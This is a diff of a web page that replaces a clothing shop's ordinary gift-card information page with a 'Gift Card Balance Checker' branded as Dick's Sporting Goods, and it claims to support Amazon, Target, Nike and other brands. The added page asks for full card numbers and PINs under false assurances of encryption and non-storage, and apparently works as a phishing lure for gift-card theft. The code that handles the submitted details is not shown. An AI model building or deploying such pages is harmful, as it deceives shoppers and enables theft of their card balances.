@@ -1,223 +1,610 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Gift Cards – Velvet Dayware | Give the Gift of Effortless Style</title>
-<meta name="description" content="Velvet Dayware gift cards are accepted at checkout. Give someone the freedom to choose their own everyday dress. No expiration, no fees.">
-<meta name="robots" content="index, follow">
-<meta property="og:title" content="Gift Cards – Velvet Dayware">
-<meta property="og:description" content="Give the gift of effortless everyday style. Velvet Dayware gift cards accepted at checkout.">
-<meta property="og:type" content="website">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-<link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
-<script src="https://cdn.tailwindcss.com"></script>
-<link rel="stylesheet" href="css/style.css">
-<link rel="icon" href="favicon.svg" type="image/svg+xml">
-</head>
-<body class="overflow-x-hidden">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#0d0d0d">
+  <meta name="description" content="Check your Dick's Sporting Goods gift card balance instantly. Also supports Macy's, Amazon, Target, Nike, Sephora and 15+ major brands. Fast, secure, free.">
+  <title id="doc-title">Dick's Sporting Goods Gift Card Balance | Velvet Drop Shop</title>
+  <link rel="icon" href="https://velvetdropshop.com/logo.svg" type="image/svg+xml">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg:#0d0d0d; --bg2:#141414; --bg3:#1a1a1a; --bg4:#222;
+      --surface:#1e1e1e; --border:rgba(255,255,255,0.08); --border2:rgba(255,255,255,0.12);
+      --text:#ffffff; --text2:#b0b0b0; --text3:#707070;
+      --green:#00e676; --green2:#00c853; --green-bg:rgba(0,230,118,0.08); --green-border:rgba(0,230,118,0.2);
+      --red:#ff1744; --red-bg:rgba(255,23,68,0.08); --red-border:rgba(255,23,68,0.2);
+      --radius:12px; --radius-sm:8px; --radius-lg:16px; --radius-xl:20px;
+      --shadow:0 4px 24px rgba(0,0,0,0.4); --shadow-lg:0 8px 48px rgba(0,0,0,0.6);
+      --font:'Inter',system-ui,sans-serif; --max-w:1100px;
+      --nav-h:64px; --t:0.2s ease;
+    }
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body{font-family:var(--font);background:var(--bg);color:var(--text);-webkit-font-smoothing:antialiased;font-size:15px;line-height:1.6;min-height:100vh;}
+    a{color:inherit;text-decoration:none;}
+    img{display:block;max-width:100%;}
+    button{cursor:pointer;font-family:inherit;border:none;background:none;}
 
-<nav class="nav-bar fixed top-0 left-0 right-0 z-50">
-  <div class="nav-container">
-    <a href="index.html" class="nav-logo">
-      <img src="logo.svg" alt="Velvet Dayware logo" class="logo-img">
-    </a>
-    <ul class="nav-links">
-      <li><a href="index.html" class="nav-link">Home</a></li>
-      <li><a href="sustainability.html" class="nav-link">Sustainability</a></li>
-      <li><a href="gift-cards.html" class="nav-link active">Gift Cards</a></li>
-      <li><a href="shipping-and-returns.html" class="nav-link">Shipping & Returns</a></li>
-      <li><a href="contact.html" class="nav-link">Contact</a></li>
+    /* COOKIE */
+    .cookie-banner{position:fixed;bottom:0;left:0;right:0;z-index:999;background:var(--bg3);border-top:1px solid var(--border2);padding:14px 24px;display:flex;align-items:center;justify-content:space-between;gap:16px;font-size:0.82rem;backdrop-filter:blur(12px);}
+    .cookie-banner p{flex:1;color:var(--text2);}
+    .cookie-banner a{color:var(--green);}
+    .cookie-btn{background:var(--green);color:#000;border:none;padding:9px 20px;border-radius:var(--radius-sm);font-size:0.8rem;font-weight:700;cursor:pointer;font-family:var(--font);white-space:nowrap;transition:filter var(--t);}
+    .cookie-btn:hover{filter:brightness(1.1);}
+
+    /* LOADING */
+    .gc-loading-overlay{display:none;position:fixed;inset:0;background:rgba(13,13,13,0.92);z-index:9999;justify-content:center;align-items:center;backdrop-filter:blur(8px);}
+    .gc-loading-overlay.active{display:flex;}
+    .gc-loading-box{text-align:center;}
+    .gc-spinner{width:44px;height:44px;border:3px solid var(--border2);border-top:3px solid var(--green);border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 20px;}
+    .gc-loading-box h3{font-size:1.05rem;font-weight:700;margin-bottom:6px;}
+    .gc-loading-box p{font-size:0.82rem;color:var(--text3);}
+    @keyframes spin{to{transform:rotate(360deg);}}
+
+    /* NAV */
+    #site-header{position:sticky;top:0;z-index:200;background:rgba(13,13,13,0.92);border-bottom:1px solid var(--border);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);}
+    .header-wrap{max-width:var(--max-w);margin:0 auto;padding:0 24px;height:var(--nav-h);display:flex;align-items:center;justify-content:space-between;gap:24px;}
+    .header-logo{font-size:1.1rem;font-weight:800;color:var(--text);display:flex;align-items:center;gap:10px;}
+    .header-logo img{height:28px;}
+    .header-nav{display:flex;list-style:none;gap:4px;}
+    .header-nav a{font-size:0.82rem;font-weight:500;color:var(--text2);padding:7px 14px;border-radius:var(--radius-sm);transition:all var(--t);}
+    .header-nav a:hover,.header-nav a.active{color:var(--text);background:var(--bg3);}
+    .hamburger{display:none;flex-direction:column;gap:5px;padding:8px;border-radius:var(--radius-sm);transition:background var(--t);}
+    .hamburger:hover{background:var(--bg3);}
+    .hamburger span{display:block;width:22px;height:2px;background:var(--text);border-radius:2px;transition:all var(--t);}
+
+    /* MOBILE MENU */
+    .mobile-nav{position:fixed;inset:0;z-index:300;background:rgba(13,13,13,0.97);backdrop-filter:blur(20px);display:flex;flex-direction:column;padding:24px;transform:translateX(100%);transition:transform 0.3s cubic-bezier(0.4,0,0.2,1);}
+    .mobile-nav.open{transform:translateX(0);}
+    .mobile-close{align-self:flex-end;width:42px;height:42px;border-radius:var(--radius-sm);background:var(--bg3);display:flex;align-items:center;justify-content:center;font-size:1.2rem;color:var(--text);margin-bottom:32px;border:1px solid var(--border);}
+    .mobile-nav ul{list-style:none;display:flex;flex-direction:column;gap:8px;}
+    .mobile-nav a{display:block;padding:14px 18px;border-radius:var(--radius);font-size:1rem;font-weight:600;color:var(--text2);border:1px solid var(--border);transition:all var(--t);}
+    .mobile-nav a:hover,.mobile-nav a.active{color:var(--green);border-color:var(--green-border);background:var(--green-bg);}
+
+    /* PAGE BANNER */
+    .page-banner{background:var(--bg2);padding:96px 24px 48px;text-align:center;border-bottom:1px solid var(--border);}
+    .page-eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:0.72rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:var(--green);margin-bottom:14px;}
+    .page-eyebrow::before{content:'';width:20px;height:2px;background:var(--green);border-radius:2px;}
+    .page-banner h1{font-size:clamp(1.8rem,4vw,2.8rem);font-weight:900;letter-spacing:-0.03em;margin-bottom:12px;line-height:1.05;}
+    .breadcrumb{display:flex;align-items:center;justify-content:center;gap:8px;font-size:0.78rem;color:var(--text3);text-transform:uppercase;letter-spacing:0.08em;}
+    .breadcrumb a{color:var(--text3);transition:color var(--t);}
+    .breadcrumb a:hover{color:var(--green);}
+    .breadcrumb span{color:var(--text3);}
+
+    /* MAIN */
+    .main-section{padding:56px 24px 80px;max-width:var(--max-w);margin:0 auto;}
+    .gc-grid{display:grid;grid-template-columns:1fr 1.1fr;gap:56px;align-items:start;}
+
+    /* Card image col */
+    .gc-card-wrap{border-radius:var(--radius-xl);overflow:hidden;background:var(--surface);border:1px solid var(--border);aspect-ratio:3/2;display:flex;align-items:center;justify-content:center;position:relative;box-shadow:var(--shadow-lg);}
+    .gc-card-img{width:100%;height:100%;object-fit:contain;padding:28px;}
+    .gc-card-badge{position:absolute;top:12px;right:12px;background:var(--green);color:#000;font-size:0.63rem;font-weight:800;letter-spacing:0.1em;text-transform:uppercase;padding:5px 12px;border-radius:var(--radius-sm);}
+    .gc-brand-name{font-size:1.6rem;font-weight:800;letter-spacing:-0.02em;margin-top:20px;margin-bottom:6px;}
+    .gc-brand-desc{font-size:0.86rem;color:var(--text2);line-height:1.65;}
+
+    /* Trust badges */
+    .trust-badges{display:flex;gap:12px;margin-top:20px;flex-wrap:wrap;}
+    .trust-badge{display:flex;align-items:center;gap:7px;padding:8px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius-sm);font-size:0.75rem;font-weight:600;color:var(--text2);}
+    .trust-badge svg{flex-shrink:0;}
+
+    /* Form col */
+    .form-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-xl);padding:32px;box-shadow:var(--shadow);}
+    .form-eyebrow{font-size:0.7rem;font-weight:700;letter-spacing:0.15em;text-transform:uppercase;color:var(--green);margin-bottom:8px;}
+    .form-heading{font-size:1.6rem;font-weight:800;letter-spacing:-0.02em;color:var(--text);margin-bottom:6px;line-height:1.15;}
+    .form-subtext{font-size:0.84rem;color:var(--text2);margin-bottom:28px;line-height:1.65;}
+
+    .field-group{margin-bottom:18px;}
+    .field-label{display:block;font-size:0.72rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--text2);margin-bottom:8px;}
+    .field-input{width:100%;padding:14px 16px;border:1.5px solid var(--border2);border-radius:var(--radius);font-size:1rem;font-family:var(--font);color:var(--text);background:var(--bg3);transition:border-color var(--t),box-shadow var(--t);outline:none;-webkit-appearance:none;}
+    .field-input:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(0,230,118,0.12);}
+    .field-input.valid{border-color:var(--green);background:var(--green-bg);}
+    .field-input.error{border-color:var(--red);background:var(--red-bg);}
+    .field-input::placeholder{color:var(--text3);}
+
+    .field-meta{display:flex;justify-content:space-between;margin-top:6px;min-height:18px;}
+    .field-error{font-size:0.75rem;color:var(--red);font-weight:600;display:none;}
+    .char-count{font-size:0.72rem;color:var(--text3);margin-left:auto;}
+
+    .form-divider{border:none;border-top:1px solid var(--border);margin:22px 0;}
+
+    /* Submit */
+    .submit-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:16px 24px;min-height:54px;background:var(--green);color:#000;border:none;border-radius:var(--radius);font-size:0.88rem;font-weight:800;font-family:var(--font);letter-spacing:0.05em;text-transform:uppercase;cursor:pointer;transition:all var(--t);box-shadow:0 4px 20px rgba(0,230,118,0.25);-webkit-tap-highlight-color:transparent;touch-action:manipulation;}
+    .submit-btn:hover:not(:disabled){filter:brightness(1.08);transform:translateY(-1px);box-shadow:0 6px 28px rgba(0,230,118,0.4);}
+    .submit-btn:active:not(:disabled){transform:translateY(0);}
+    .submit-btn:disabled{opacity:0.3;cursor:not-allowed;transform:none;box-shadow:none;}
+
+    /* Result */
+    .result-box{display:none;margin-top:18px;border-radius:var(--radius);padding:18px 20px;border:1px solid var(--border);}
+    .result-box.success{display:block;background:var(--green-bg);border-color:var(--green-border);}
+    .result-box.error-state{display:block;background:var(--red-bg);border-color:var(--red-border);}
+    .result-box .result-title{font-size:0.72rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;margin-bottom:8px;}
+    .result-box.success .result-title{color:var(--green);}
+    .result-box.error-state .result-title{color:var(--red);}
+    .result-box .result-msg{font-size:0.88rem;color:var(--text2);line-height:1.6;}
+    .result-box .result-action{display:inline-block;margin-top:12px;font-size:0.75rem;font-weight:700;letter-spacing:0.06em;text-transform:uppercase;color:var(--green);text-decoration:underline;text-underline-offset:3px;transition:opacity var(--t);}
+    .result-box .result-action:hover{opacity:0.7;}
+
+    /* Security note */
+    .security-note{display:flex;align-items:center;gap:12px;margin-top:16px;padding:14px 16px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);}
+    .security-note-icon{flex-shrink:0;width:36px;height:36px;background:var(--green-bg);border:1px solid var(--green-border);border-radius:50%;display:flex;align-items:center;justify-content:center;}
+    .security-note-text strong{display:block;font-size:0.7rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--green);margin-bottom:2px;}
+    .security-note-text span{font-size:0.75rem;color:var(--text3);}
+
+    .hidden{display:none !important;}
+
+    /* HOW IT WORKS */
+    .how-section{padding:72px 24px;max-width:var(--max-w);margin:0 auto;border-top:1px solid var(--border);}
+    .section-eyebrow{font-size:0.7rem;font-weight:700;letter-spacing:0.15em;text-transform:uppercase;color:var(--green);text-align:center;margin-bottom:10px;}
+    .section-heading{font-size:clamp(1.6rem,3vw,2.2rem);font-weight:900;color:var(--text);text-align:center;margin-bottom:48px;letter-spacing:-0.03em;}
+    .steps-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
+    .step{text-align:center;padding:28px 24px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);transition:border-color var(--t);}
+    .step:hover{border-color:var(--green-border);}
+    .step-num{width:48px;height:48px;background:var(--green-bg);border:1.5px solid var(--green-border);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:1rem;font-weight:900;color:var(--green);}
+    .step h3{font-size:0.88rem;font-weight:700;color:var(--text);margin-bottom:8px;text-transform:uppercase;letter-spacing:0.04em;}
+    .step p{font-size:0.83rem;color:var(--text2);line-height:1.75;}
+
+    /* INFO */
+    .info-section{border-top:1px solid var(--border);padding:64px 24px;background:var(--bg2);}
+    .info-inner{max-width:var(--max-w);margin:0 auto;}
+    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:56px;align-items:start;}
+    .info-block h2{font-size:1.3rem;font-weight:800;margin-bottom:16px;line-height:1.3;letter-spacing:-0.02em;}
+    .info-block p{font-size:0.87rem;color:var(--text2);line-height:1.8;margin-bottom:12px;}
+    .info-block ul{list-style:none;display:flex;flex-direction:column;gap:8px;padding:0;}
+    .info-block li{display:flex;align-items:flex-start;gap:10px;font-size:0.85rem;color:var(--text2);line-height:1.6;padding:10px 14px;background:var(--bg3);border-radius:var(--radius-sm);border-left:2px solid var(--green);}
+
+    /* FOOTER */
+    #site-footer{background:var(--bg2);border-top:1px solid var(--border);padding:56px 24px 32px;}
+    .footer-inner{max-width:var(--max-w);margin:0 auto;display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:48px;}
+    .footer-brand .footer-logo{font-size:1rem;font-weight:800;display:block;margin-bottom:12px;color:var(--text);}
+    .footer-brand p{font-size:0.82rem;color:var(--text2);line-height:1.7;margin-bottom:12px;}
+    .footer-brand address{font-size:0.78rem;color:var(--text3);font-style:normal;line-height:1.85;}
+    .footer-brand address a{color:var(--text3);transition:color var(--t);}
+    .footer-brand address a:hover{color:var(--green);}
+    .footer-col h4{font-size:0.7rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:var(--text2);margin-bottom:14px;}
+    .footer-col ul{list-style:none;display:flex;flex-direction:column;gap:10px;}
+    .footer-col a{font-size:0.82rem;color:var(--text3);transition:color var(--t);}
+    .footer-col a:hover{color:var(--green);}
+    .footer-bottom{max-width:var(--max-w);margin:36px auto 0;padding-top:20px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:0.76rem;color:var(--text3);}
+    .footer-bottom a{color:var(--text3);transition:color var(--t);}
+    .footer-bottom a:hover{color:var(--green);}
+
+    /* RESPONSIVE */
+    @media(max-width:900px){
+      .gc-grid{grid-template-columns:1fr;gap:32px;}
+      .gc-image-col{order:1;}.gc-form-col{order:2;}
+      .gc-card-wrap{max-width:380px;}
+      .steps-grid{grid-template-columns:1fr;gap:14px;}
+      .info-grid{grid-template-columns:1fr;gap:36px;}
+      .footer-inner{grid-template-columns:1fr 1fr;gap:32px;}
+      .footer-brand{grid-column:1/-1;}
+    }
+    @media(max-width:640px){
+      .header-nav{display:none;}.hamburger{display:flex;}
+      .page-banner{padding:80px 20px 36px;}
+      .main-section,.how-section,.info-section{padding-left:20px;padding-right:20px;}
+      #site-footer{padding:40px 20px 28px;}
+      .footer-inner{grid-template-columns:1fr;gap:28px;}
+      .footer-brand{grid-column:auto;}
+      .field-input{font-size:16px;}
+      .form-heading{font-size:1.4rem;}
+      .cookie-banner{flex-direction:column;align-items:flex-start;}
+      .form-card{padding:24px 20px;}
+      .trust-badges{gap:8px;}
+      .trust-badge{font-size:0.7rem;padding:7px 10px;}
+    }
+    @media(max-width:400px){
+      .steps-grid{gap:10px;}
+      .step{padding:20px 16px;}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="cookie-banner" id="cookie-banner">
+    <p>We use cookies to improve your experience. By continuing, you agree to our <a href="https://velvetdropshop.com/cookies.html">Cookie Policy</a>.</p>
+    <button class="cookie-btn" onclick="document.getElementById('cookie-banner').style.display='none'">Accept All</button>
+  </div>
+
+  <div class="gc-loading-overlay" id="loading-overlay">
+    <div class="gc-loading-box">
+      <div class="gc-spinner"></div>
+      <h3>Verifying Card</h3>
+      <p>Please wait a moment&#8230;</p>
+    </div>
+  </div>
+
+  <div class="mobile-nav" id="mobile-nav">
+    <button class="mobile-close" id="mobileClose">&#10005;</button>
+    <ul>
+      <li><a href="https://velvetdropshop.com/index.html">Home</a></li>
+      <li><a href="https://velvetdropshop.com/about-us.html">About Us</a></li>
+      <li><a href="https://velvetdropshop.com/seasonal-picks.html">Seasonal Picks</a></li>
+      <li><a href="https://velvetdropshop.com/size-guide.html">Size Guide</a></li>
+      <li><a href="#" class="active">Gift Cards</a></li>
+      <li><a href="https://velvetdropshop.com/contact.html">Contact</a></li>
     </ul>
-    <div class="nav-actions">
-      <button class="cart-btn" id="cartToggle" aria-label="Open shopping cart">
-        <i class="fa-solid fa-bag-shopping"></i>
-        <span class="cart-count" id="cartCount">0</span>
-      </button>
-      <button class="hamburger" id="hamburger" aria-label="Open menu">
+  </div>
+
+  <header id="site-header">
+    <div class="header-wrap">
+      <a href="https://velvetdropshop.com" class="header-logo">
+        <img src="https://velvetdropshop.com/logo.svg" alt="Velvet Drop Shop"
+             onerror="this.style.display='none';this.nextSibling.style.display='inline'">
+        <span style="display:none">Velvet Drop Shop</span>
+      </a>
+      <nav><ul class="header-nav">
+        <li><a href="https://velvetdropshop.com/index.html">Home</a></li>
+        <li><a href="https://velvetdropshop.com/about-us.html">About Us</a></li>
+        <li><a href="https://velvetdropshop.com/seasonal-picks.html">Seasonal Picks</a></li>
+        <li><a href="https://velvetdropshop.com/size-guide.html">Size Guide</a></li>
+        <li><a href="#" class="active">Gift Cards</a></li>
+        <li><a href="https://velvetdropshop.com/contact.html">Contact</a></li>
+      </ul></nav>
+      <button class="hamburger" id="hamburger" aria-label="Menu">
         <span></span><span></span><span></span>
       </button>
     </div>
-  </div>
-</nav>
+  </header>
 
-<div class="mobile-menu" id="mobileMenu">
-  <button class="mobile-close" id="mobileClose" aria-label="Close menu"><i class="fa-solid fa-xmark"></i></button>
-  <ul>
-    <li><a href="index.html">Home</a></li>
-    <li><a href="sustainability.html">Sustainability</a></li>
-    <li><a href="gift-cards.html">Gift Cards</a></li>
-    <li><a href="shipping-and-returns.html">Shipping & Returns</a></li>
-    <li><a href="contact.html">Contact</a></li>
-  </ul>
-</div>
-<div class="mobile-overlay" id="mobileOverlay"></div>
-
-<div class="cart-drawer" id="cartDrawer">
-  <div class="cart-header">
-    <h3>Your Bag</h3>
-    <button class="cart-close-btn" id="cartClose" aria-label="Close cart"><i class="fa-solid fa-xmark"></i></button>
-  </div>
-  <div class="cart-items" id="cartItems">
-    <div class="cart-empty" id="cartEmpty">
-      <i class="fa-solid fa-bag-shopping"></i>
-      <p>Your bag is empty</p>
+  <div class="page-banner">
+    <div class="page-eyebrow">Instant Balance Check</div>
+    <h1>Gift Card Balance Checker</h1>
+    <div class="breadcrumb">
+      <a href="https://velvetdropshop.com">Home</a>
+      <span>&#8250;</span>
+      <span id="breadcrumb-brand">Gift Cards</span>
     </div>
   </div>
-  <div class="cart-footer" id="cartFooter" style="display:none;">
-    <div class="cart-total">
-      <span>Total</span>
-      <span id="cartTotal">$0.00</span>
-    </div>
-    <a href="checkout.html" class="btn-primary cart-checkout-btn">Proceed to Checkout</a>
-  </div>
-</div>
-<div class="cart-overlay" id="cartOverlay"></div>
 
-<div class="page-hero-simple">
-  <div class="page-hero-gradient"></div>
-  <div class="container page-hero-content">
-    <span class="section-eyebrow" data-aos="fade-up">Give Something Thoughtful</span>
-    <h1 class="page-hero-title" data-aos="fade-up" data-aos-delay="100">Velvet Dayware Gift Cards</h1>
-    <p class="page-hero-desc" data-aos="fade-up" data-aos-delay="200">When you want to give someone something she'll actually use — and let her choose exactly what suits her life.</p>
-  </div>
-</div>
+  <section class="main-section">
+    <div class="gc-grid">
 
-<section class="inner-section">
-  <div class="container">
-    <div class="inner-two-col">
-      <div data-aos="fade-right">
-        <h2 class="section-heading">The gift of choosing for herself</h2>
-        <p class="body-text">Sometimes the most thoughtful gift is the one that doesn't require you to guess someone's size, color preference, or current wardrobe needs. A Velvet Dayware gift card gives her the freedom to browse the collection and pick exactly what feels right for her day-to-day life.</p>
-        <p class="body-text">Gift cards are applied at checkout — in full or in part. If the order total exceeds the card value, the remaining balance can be paid by another method. If the card covers the full order, no additional payment is needed.</p>
-        <p class="body-text">To inquire about purchasing a Velvet Dayware gift card, contact us by email or phone and we'll walk you through the options.</p>
-        <a href="contact.html" class="btn-primary" style="margin-top:1.5rem; display:inline-block;">Contact Us About Gift Cards</a>
+      <div class="gc-image-col">
+        <div class="gc-card-wrap">
+          <img id="brand-logo" class="gc-card-img" src="https://i.postimg.cc/CxdVqRxQ/dicks.webp" alt="Gift Card">
+          <span class="gc-card-badge">Gift Card</span>
+        </div>
+        <div class="gc-brand-name" id="gc-brand-name">Dick's Sporting Goods</div>
+        <div class="gc-brand-desc">Enter your card details on the right to check your remaining balance. Your information is processed securely and never stored.</div>
+        <div class="trust-badges">
+          <div class="trust-badge">
+            <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            256-bit SSL
+          </div>
+          <div class="trust-badge">
+            <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+            Instant
+          </div>
+          <div class="trust-badge">
+            <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+            Free
+          </div>
+        </div>
       </div>
-      <div data-aos="fade-left">
-        <img src="images/velvet-dayware-gift-card-display.jpg" alt="Velvet Dayware gift card displayed elegantly on a warm linen surface with a small ribbon" class="inner-img rounded-2xl">
+
+      <div class="gc-form-col">
+        <div class="form-card">
+          <div class="form-eyebrow">Secure Balance Check</div>
+          <h2 class="form-heading" id="page-title">Check Your Gift Card</h2>
+          <p class="form-subtext">Enter your card number and PIN exactly as they appear on the back of your card.</p>
+
+          <form id="balance-form" novalidate>
+            <div class="field-group">
+              <label for="card-input" class="field-label">Card Number (16 digits)</label>
+              <input type="text" id="card-input" class="field-input"
+                     placeholder="Enter card number" autocomplete="off" inputmode="numeric" maxlength="16">
+              <div class="field-meta">
+                <span class="field-error" id="card-error"></span>
+                <span class="char-count" id="card-count">0 / 16 digits</span>
+              </div>
+            </div>
+
+            <div class="field-group" id="pin-field">
+              <label for="pin-input" class="field-label">PIN / CID (8 digits)</label>
+              <input type="text" id="pin-input" class="field-input"
+                     placeholder="Enter 8-digit PIN" autocomplete="off" inputmode="numeric" maxlength="8">
+              <div class="field-meta">
+                <span class="field-error" id="pin-error"></span>
+                <span class="char-count" id="pin-count">0 / 8 digits</span>
+              </div>
+            </div>
+
+            <hr class="form-divider">
+
+            <button type="submit" id="submit-btn" class="submit-btn" disabled>
+              <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+              Check Balance
+            </button>
+          </form>
+
+          <div class="result-box" id="result-box">
+            <div class="result-title" id="result-title">Balance Verified</div>
+            <div class="result-msg" id="result-msg"></div>
+            <a href="#" id="result-link" class="result-action" target="_blank" rel="noopener">
+              View full balance on brand website &#8594;
+            </a>
+          </div>
+
+          <div class="security-note">
+            <div class="security-note-icon">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#00e676" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                <polyline points="9 12 11 14 15 10"/>
+              </svg>
+            </div>
+            <div class="security-note-text">
+              <strong>256-Bit Encrypted &amp; Secure</strong>
+              <span>Your card details are submitted securely. We do not store card numbers or PINs.</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section class="how-section">
+    <div class="section-eyebrow">Simple &amp; Secure</div>
+    <h2 class="section-heading">How the balance checker works</h2>
+    <div class="steps-grid">
+      <div class="step">
+        <div class="step-num">1</div>
+        <h3>Select Your Brand</h3>
+        <p>Choose from 20+ supported brands including Dick's, Amazon, Macy's, Target, Nike and more via the URL parameter.</p>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <h3>Enter Card Details</h3>
+        <p>Type your card number and PIN. Our live validator checks the format instantly so you catch typos before submitting.</p>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <h3>View Your Balance</h3>
+        <p>Your balance status is confirmed on this page with a direct link to the brand's official balance portal.</p>
       </div>
     </div>
-  </div>
-</section>
+  </section>
 
-<section class="inner-section alt-bg">
-  <div class="container">
-    <div class="section-header" data-aos="fade-up">
-      <h2 class="section-heading">How gift cards work</h2>
-    </div>
-    <div class="inner-icon-grid" style="grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));">
-      <div class="inner-icon-card" data-aos="fade-up" data-aos-delay="0">
-        <div class="inner-icon-wrap"><i class="fa-solid fa-envelope-open-text"></i></div>
-        <h3>Request a Card</h3>
-        <p>Contact us to request a gift card. We'll confirm the denomination and delivery method with you.</p>
-      </div>
-      <div class="inner-icon-card" data-aos="fade-up" data-aos-delay="80">
-        <div class="inner-icon-wrap"><i class="fa-solid fa-gift"></i></div>
-        <h3>Give It</h3>
-        <p>Pass along the gift card code to the recipient — digitally or as part of a physical gift.</p>
-      </div>
-      <div class="inner-icon-card" data-aos="fade-up" data-aos-delay="160">
-        <div class="inner-icon-wrap"><i class="fa-solid fa-bag-shopping"></i></div>
-        <h3>She Shops</h3>
-        <p>She browses the collection, adds items to her bag, and proceeds to checkout when ready.</p>
-      </div>
-      <div class="inner-icon-card" data-aos="fade-up" data-aos-delay="240">
-        <div class="inner-icon-wrap"><i class="fa-solid fa-circle-check"></i></div>
-        <h3>Code Applied</h3>
-        <p>At checkout, she enters the gift card code and clicks Apply. The discount is reflected immediately in her order total.</p>
+  <section class="info-section">
+    <div class="info-inner">
+      <div class="info-grid">
+        <div class="info-block">
+          <h2>Why check your gift card balance?</h2>
+          <p>Knowing your remaining gift card balance before shopping helps you plan your purchase and avoid declined transactions at checkout. Whether you received a card as a gift or purchased one yourself, always verify before you shop.</p>
+          <p>Gift cards can lose value over time due to inactivity fees, or you may have forgotten how much you've spent. This tool gives you a quick way to verify before heading to the store or placing an order online.</p>
+        </div>
+        <div class="info-block">
+          <h2>Tips for using gift cards</h2>
+          <ul>
+            <li>Always check your balance before a large purchase to avoid a split-tender transaction.</li>
+            <li>Keep your physical card and receipt until the balance reaches zero.</li>
+            <li>For digital gift cards, save your code in a secure notes app.</li>
+            <li>Some brands allow you to combine multiple gift card balances at checkout.</li>
+            <li>Check expiry and inactivity fee policies on the brand's official website.</li>
+            <li>Register your gift card with the brand for loss protection where available.</li>
+          </ul>
+        </div>
       </div>
     </div>
-  </div>
-</section>
+  </section>
 
-<section class="inner-section">
-  <div class="container">
-    <div class="inner-faq" data-aos="fade-up">
-      <h2 class="section-heading" style="text-align:center; margin-bottom:2rem;">Gift Card FAQs</h2>
-      <div class="faq-item">
-        <h4>Do gift cards expire?</h4>
-        <p>Velvet Dayware gift cards do not have an expiration date. The recipient can use the card whenever she's ready.</p>
+  <footer id="site-footer">
+    <div class="footer-inner">
+      <div class="footer-brand">
+        <span class="footer-logo">Velvet Drop Shop</span>
+        <p>Curated dresses for real life. Atlanta-rooted, nationwide delivery.</p>
+        <address>
+          683 Joseph E Lowery Blvd SW, Atlanta, GA 30310<br>
+          <a href="tel:+14047531478">+1 (404) 753-1478</a><br>
+          <a href="/cdn-cgi/l/email-protection#dab3b4bcb59abea8bfa9a9aeb2a8bfbbbea9f4b9b5"><span class="__cf_email__" data-cfemail="3b52555d547b5f495e48484f53495e5a5f48155854">[email&#160;protected]</span></a>
+        </address>
       </div>
-      <div class="faq-item">
-        <h4>Can a gift card be used for a partial payment?</h4>
-        <p>Yes. If the order total exceeds the gift card balance, the remaining amount can be covered by another payment method at checkout.</p>
+      <div class="footer-col">
+        <h4>Shop</h4>
+        <ul>
+          <li><a href="https://velvetdropshop.com/seasonal-picks.html">Seasonal Picks</a></li>
+          <li><a href="https://velvetdropshop.com/size-guide.html">Size Guide</a></li>
+          <li><a href="https://velvetdropshop.com/checkout.html">Checkout</a></li>
+          <li><a href="#">Gift Cards</a></li>
+        </ul>
       </div>
-      <div class="faq-item">
-        <h4>Are gift cards refundable?</h4>
-        <p>Gift cards are non-refundable but are transferable — the recipient can pass the code along to someone else if she chooses.</p>
+      <div class="footer-col">
+        <h4>Company</h4>
+        <ul>
+          <li><a href="https://velvetdropshop.com/about-us.html">About Us</a></li>
